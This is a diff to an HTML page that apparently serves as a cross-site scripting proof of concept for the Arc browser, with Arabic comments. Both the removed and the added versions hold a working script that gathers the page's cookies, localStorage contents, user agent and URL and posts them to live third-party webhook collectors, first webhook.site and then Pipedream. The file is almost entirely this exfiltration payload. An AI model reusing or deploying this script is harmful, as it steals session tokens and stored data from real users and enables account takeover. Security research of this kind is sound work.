@@ -1,28 +1,43 @@
 <!DOCTYPE html>
-<html>
-  <head>
-    <title>Arc XSS Test</title>
-  </head>
-  <body>
-    <script>
-      // لتأكيد تشغيل السكربت
-      console.log("✅ JavaScript is running!");
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Arc XSS PoC</title>
+</head>
+<body>
+  <script>
+    // تأكيد أن السكربت اشتغل (هيظهر في DevTools)
+    console.log("✅ JavaScript is running inside Arc!");
 
-      // إرسال البيانات إلى Webhook
-      fetch("https://webhook.site/23aa3c8e-75cb-4dd9-9e94-68a9856a4bcf", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          cookies: document.cookie,
-          localStorage: Object.assign({}, localStorage),
-          userAgent: navigator.userAgent,
-          url: window.location.href
-        })
-      });
-    </script>
+    // محاولة استخراج البيانات الحساسة
+    const data = {
+      cookies: document.cookie || "No cookies found",
+      localStorage: (() => {
+        try {
+          return Object.assign({}, localStorage);
+        } catch (e) {
+          return "localStorage access denied";
+        }
+      })(),
+      userAgent: navigator.userAgent,
+      url: window.location.href,
+      timestamp: new Date().toISOString()
+    };
 
-    <p>Loading...</p>
-  </body>
+    // إرسال البيانات إلى Pipedream Webhook
+    fetch("https://eox6wqozfkkmnr7.m.pipedream.net", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(data)
+    }).then(response => {
+      console.log("📡 Data sent to webhook:", response.status);
+    }).catch(error => {
+      console.error("❌ Failed to send data:", error);
+    });
+  </script>
+
+  <p style="font-family: sans-serif;">Loading...</p>
+</body>
 </html>
